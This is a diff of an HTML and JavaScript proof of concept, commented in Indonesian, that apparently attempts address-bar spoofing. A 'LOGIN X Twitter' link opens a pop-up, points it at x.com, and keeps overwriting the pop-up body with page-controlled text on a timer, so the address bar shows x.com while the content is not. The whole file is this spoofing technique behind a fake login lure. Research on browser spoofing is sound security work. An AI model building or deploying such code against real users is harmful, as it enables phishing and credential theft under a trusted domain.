@@ -1,30 +1,31 @@
 <script>
-  function next() {
-    // Redirect ke halaman lain setelah x.com selesai dimuat
-    w.location.replace('https://www.google.com:1234');
-  }
-
   function f() {
     // Membuka jendela pop-up kosong
     w = window.open("");  
     w.document.write('<h2>This is not x.com!</h2>');  // Menampilkan konten sementara
-    
-    // Mengubah lokasi ke x.com, yang akan muncul di address bar
+
+    // Mengubah lokasi ke x.com, akan mengubah address bar
     w.location = "https://x.com";
 
-    // Mengecek apakah lokasi sudah berubah menjadi x.com
-    let checkLocation = setInterval(function() {
-      try {
-        if (w.location.href === "https://x.com") {
-          clearInterval(checkLocation); // Jika sudah ke x.com, hentikan interval
-        }
-      } catch (e) {
-        // Jika ada error (misalnya, terjadi masalah dengan pop-up atau redirect), hentikan interval dan redirect ke halaman lain
-        clearInterval(checkLocation);
-        next();
+    // Membuat efek loading bolak-balik di konten pop-up
+    let counter = 0;
+    let loadingInterval = setInterval(function() {
+      counter++;
+      if (counter % 2 === 0) {
+        // Ganti konten pop-up dengan "This is not x.com!"
+        w.document.body.innerHTML = "<h2>This is not x.com!</h2>";
+      } else {
+        // Ganti konten pop-up dengan "Loading..." untuk efek bolak-balik
+        w.document.body.innerHTML = "<h2>Loading...</h2>";
       }
-    }, 100);  // Mengecek lokasi setiap 100ms untuk stabilitas
+    }, 500);  // Interval untuk bolak-balik konten (500ms)
+
+    // Hentikan interval setelah beberapa detik dan pastikan konten tetap di x.com
+    setTimeout(function() {
+      clearInterval(loadingInterval);  // Berhenti bolak-balik setelah 5 detik
+      w.document.body.innerHTML = "<h2>This is not x.com!</h2>"; // Tampilkan kembali konten asli
+    }, 5000);  // Interval untuk mengubah konten menjadi stabil setelah 5 detik
   }
 </script>
 
-<a href="#" onclick="f()">LOGIN X</a>
+<a href="#" onclick="f()">LOGIN X Twitter</a>
